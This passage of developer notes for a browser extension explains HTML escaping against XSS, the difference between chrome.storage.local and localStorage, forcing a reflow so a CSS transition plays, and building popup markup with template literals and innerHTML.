XSS (Cross-Site Scripting) happens when user-controlled text is inserted into HTML and the browser executes it. `escapeHTML` converts `<` → `&lt;` and `>` → `&gt;`, making any HTML tags display as literal text instead of running as code.

### `chrome.storage.local` vs `localStorage`
`localStorage` is isolated per website origin — it belongs to the website you're on. `chrome.storage.local` belongs to your extension and is accessible from all your extension scripts (content, background, options) regardless of which site you're visiting.

### `void popupEl.offsetWidth` — Force Reflow
The browser batches DOM changes and applies them together. If you set `display:block` and add a CSS class in the same tick, the browser may skip any visual difference between the two states, cancelling the CSS transition. Reading `offsetWidth` forces an immediate layout calculation, breaking the batch and ensuring the animation plays.

### Template Literals and `innerHTML`
Backtick strings (`` `...` ``) allow multi-line HTML and embedded JS expressions (`${expression}`). This is how we build the entire popup card as a string and write it in one shot with `popupEl.innerHTML = ...`. It's fast, readable, and completely replaces any previous content cleanly.
